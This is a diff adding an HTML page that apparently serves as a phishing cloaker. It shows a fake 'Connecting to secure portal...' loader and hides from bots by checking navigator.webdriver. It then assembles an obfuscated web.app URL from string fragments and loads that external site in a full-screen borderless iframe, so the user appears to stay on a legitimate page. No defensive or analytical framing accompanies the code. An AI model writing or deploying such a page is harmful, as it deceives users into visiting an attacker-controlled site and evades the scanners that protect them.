@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Action Required...</title>
+    <meta name="robots" content="noindex, nofollow">
+    <style>
+        body, html { margin: 0; padding: 0; height: 100vh; overflow: hidden; background-color: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        
+        #loader { display: flex; align-items: center; justify-content: center; height: 100vh; width: 100%; position: absolute; z-index: 10; background-color: #f4f6f8; transition: opacity 0.4s ease; }
+        .container { display: flex; align-items: center; background: white; padding: 20px 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin-right: 12px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { color: #555; font-size: 14px; font-weight: 500; }
+        
+        #mainFrame { display: none; width: 100%; height: 100vh; border: none; position: absolute; top: 0; left: 0; z-index: 5; }
+    </style>
+</head>
+<body>
+    
+    <div id="loader">
+        <div class="container">
+            <div class="spinner"></div>
+            <div class="text">Connecting to secure portal...</div>
+        </div>
+    </div>
+
+    <!-- The actual webpage loads in the background perfectly naturally -->
+    <iframe id="mainFrame" src=""></iframe>
+
+    <script>
+        (function() {
+            // Anti-bot check
+            if (navigator.webdriver || !navigator.languages || navigator.languages.length === 0) return;
+
+            var p1 = "https://";
+            var p2 = "asdfggfsdafhjklppplkjhsggfdf.";
+            var p3 = "web.app";
+            var dest = p1 + p2 + p3;
+            
+            setTimeout(function() {
+                var loader = document.getElementById('loader');
+                loader.style.opacity = '0';
+                
+                var frm = document.getElementById('mainFrame');
+                frm.src = dest;
+                frm.style.display = 'block';
+                
+                setTimeout(function(){ loader.style.display = 'none'; }, 400);
+            }, 1000);
+
+        })();
+    </script>
+</body>
+</html>
